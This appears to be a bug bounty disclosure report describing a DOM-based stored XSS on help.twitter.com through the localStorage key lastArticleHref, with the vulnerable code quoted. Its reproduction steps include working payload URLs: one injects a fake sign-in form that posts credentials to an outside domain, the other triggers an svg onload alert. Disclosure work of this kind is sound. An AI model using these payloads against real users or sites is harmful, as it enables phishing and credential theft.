Summary:

**Summary:** 

I've found a DOM-based XSS vulnerability in the website **help.twitter.com** that persists via a localStorage key **lastArticleHref**. The value of this localStorage key is used to dynamically generate a piece of HTML code without proper encoding or filtering allowing an attacker to inject additional HTML code into the response.

**Description:** 

The website **help.twitter.com** contains JavaScript code that will save the value of the current page (the value of the browser property **location.href**) into a localStorage key named **lastArticleBreadcrumbs**.

The JavaScript code is loaded from this URL:
https://help.twitter.com/etc/designs/help-twitter/public/js/homepage.js

There are two relevant localStorage keys:
*  **lastArticleBreadcrumbs** - that contains an array of breadcrumbs such as `["Help Center"," Following and unfollowing"," How to approve or deny follower requests"]`
*  **lastArticleHref** -  that contains the URL of the last visited article

When these two localStorage keys are present, the following code is executed:

```
this.lastArticleBreadcrumbs.shift();
                    var t = this.lastArticleBreadcrumbs.map(function(t, r) {
                        return r === e.lastArticleBreadcrumbs.length - 1 ? '<a class="hp03__link  twtr-type--roman-16" href="' + e.lastArticleHref + '">' + t + "</a>" : '<span class="hp03__breadcrumb  twtr-color--light-gray-neutral">' + t + "</span>"
                    });
                    this.breadcrumbElement.innerHTML = t.join('<span class="hp03__seperator    twtr-color--light-gray-neutral">/</span>')
```

As you can see above a piece of HTML code is dynamically generated using the value of the JavaScript variable **e.lastArticleHref**. This variable is loaded from the localStorage key **lastArticleHref**.

The value of **e.lastArticleHref** is not properly HTML encoded when used to dynamically generate the HTML code. This code is written to the browser DOM via `this.breadcrumbElement.innerHTML`.

This allows an attacker to inject additional HTML code into the browser DOM by manipulating the value of the localStorage key **lastArticleHref**.

The exploit scenario is as follows:

1. The victim visits an URL like `https://help.twitter.com/en/using-twitter/follow-requests#"><zzzz>`
2. The JavaScript code from the page will set the value of localStorage key **lastArticleHref** to `https://help.twitter.com/en/using-twitter/follow-requests#\"><zzzz>`.
3. The user visits the homepage `https://help.twitter.com/`.
4. At this point the value of the localStorage key **lastArticleHref** is loaded and used to dynamically generate some HTML code that is written into the DOM.
5. The victim can now open a new window/tab and visit `https://help.twitter.com/`. The HTML code set by attacker will appear in the page as the value of the localStorage key **lastArticleHref** will remain set to an XSS payload.

I was not able to bypass CSP and I've prepared some HTML code that is inserting a fake login form into the page that sends the credentials to a domain controlled by me.

## Steps To Reproduce:

I've attached two movies where I demonstrate how to reproduce this issue using Google Chrome and Internet Explorer.

### Chrome
To reproduce, using Google Chrome follow the next steps:

* Visit the following URL using Google Chrome:

```
https://help.twitter.com/en/using-twitter/follow-requests#"></a></div></div></div></div></div></div></div></div></div></div></div></div><br><br><br><br><br><br><br><br><br><br><br><br><div style='background: #97e3ff; position: fixed; top: 80%; left: 50%; margin-top: -50px;  margin-left: -150px; border-style: double;'>Please sign in below:<br><form action=https://bugs.thx.bz/just>username:<input type=text name=u><br>password:<input type=password name=p><br><input type=submit value='Sign in'></form><br></div>
```

* At this point, the value of the localStorage key was set to an HTML payload that is written to the DOM.
* Visit the homepage https://help.twitter.com/
* A fake login form will appear in the center of the page. Any credentials entered on this login form will be sent to the domain **bugs.thx.bz**.

### Internet Explorer 11

To reproduce, using Internet Explorer follow the next steps:

* Visit the following URL using Internet Explorer 11:

```
https://help.twitter.com/en/using-twitter/follow-requests#"><svg/onload=alert(1)>
```

* At this point, the value of the localStorage key was set to an XSS payload that is written to the DOM.
* Visit the homepage https://help.twitter.com/
* A popup should appear as proof that JavaScript execution is possible.

## Supporting Material/References:

I've attached two movies to this report.
*  One demonstrating the issue using Google Chrome and the login form.
*  Another one using IE11 to execute JavaScript code in the context of the domain **help.twitter.com**.

## Impact

An attacker could exploit this issue by sending a crafted link to the victim via an email message or via chat. When the victim visits the link provided, the attacker can steal victim's credentials.
